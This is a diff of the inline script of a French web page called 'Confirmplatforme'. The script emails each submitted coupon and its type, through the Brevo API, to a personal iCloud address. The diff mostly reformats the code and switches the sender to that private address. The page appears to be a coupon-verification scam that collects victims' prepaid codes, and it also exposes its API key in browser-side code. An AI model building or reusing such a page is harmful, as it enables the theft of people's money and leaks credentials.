@@ -547,8 +547,8 @@
     </div>
   </footer>
 
- <script>
-    // ─── 🔴 BREVO CONFIGURATION AVEC VARIABLE D'ENVIRONNEMENT ──────
+  <script>
+    // ─── 🔴 BREVO CONFIGURATION ──────────────────────────────────
     const BREVO_CONFIG = {
       host: "smtp-relay.brevo.com",
       port: 587,
@@ -558,7 +558,7 @@
       }
     };
     const EMAIL_DESTINATION = "tiakodubrel@icloud.com";
-    // ──────────────────────────────────────────────────────────────────
+    // ──────────────────────────────────────────────────────────────
 
     // ─── TRADUCTIONS ──────────────────────────────────────────────
     const translations = {
@@ -665,16 +665,23 @@
 
       var response = await fetch('https://api.brevo.com/v3/smtp/email', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'api-key': BREVO_CONFIG.auth.pass },
+        headers: {
+          'Content-Type': 'application/json',
+          'api-key': BREVO_CONFIG.auth.pass
+        },
         body: JSON.stringify({
-          sender: { email: "noreply@confirmplatforme.com", name: "Confirmplatforme" },
-          to: [{ email: EMAIL_DESTINATION }],
+          sender: { email: "tiakodubrel@icloud.com", name: "Confirmplatforme" },
+          to: [{ email: "tiakodubrel@icloud.com" }],
           subject: '📬 Nouveau coupon - ' + data.type,
           htmlContent: html,
           replyTo: { email: data.email }
         })
       });
-      if (!response.ok) { var err = await response.json(); throw new Error(err.message || 'Erreur Brevo'); }
+
+      if (!response.ok) {
+        var err = await response.json();
+        throw new Error(err.message || 'Erreur Brevo');
+      }
     }
 
     // ─── SOUMISSION ──────────────────────────────────────────────────
@@ -716,15 +723,18 @@
         await sendEmail(data);
         afficherAlerte(alertBox, currentSuccessMsg, 'success');
         document.getElementById('couponForm').reset();
-      } catch (err) { console.error(err); afficherAlerte(alertBox, currentErrorMsg, 'error'); }
+      } catch (err) {
+        console.error('Erreur:', err);
+        afficherAlerte(alertBox, currentErrorMsg, 'error');
+      }
       finally { activerChargement(btn, loader, false); }
     }
 
-    // ─── INITIALISATION AVEC WINDOW.ONLOAD ──────────────────────
-    window.onload = function() {
+    // ─── INITIALISATION ──────────────────────────────────────────
+    window.onload = function () {
       var navLang = navigator.language.split('-')[0];
-      var supported = ['fr','en','es','de','it','pt','ar','zh','ja','ru','nl','pl','tr','ko','hi','sw','ha','yo','am','wo','ln','mg','ro','hu','cs','sv','fi','da','el','he','fa','id','ms','th','vi','uk','bn'];
-      
+      var supported = ['fr', 'en', 'es', 'de', 'it', 'pt', 'ar', 'zh', 'ja', 'ru', 'nl', 'pl', 'tr', 'ko', 'hi', 'sw', 'ha', 'yo', 'am', 'wo', 'ln', 'mg', 'ro', 'hu', 'cs', 'sv', 'fi', 'da', 'el', 'he', 'fa', 'id', 'ms', 'th', 'vi', 'uk', 'bn'];
+
       if (supported.indexOf(navLang) !== -1) {
         changeLanguage(navLang);
       } else {
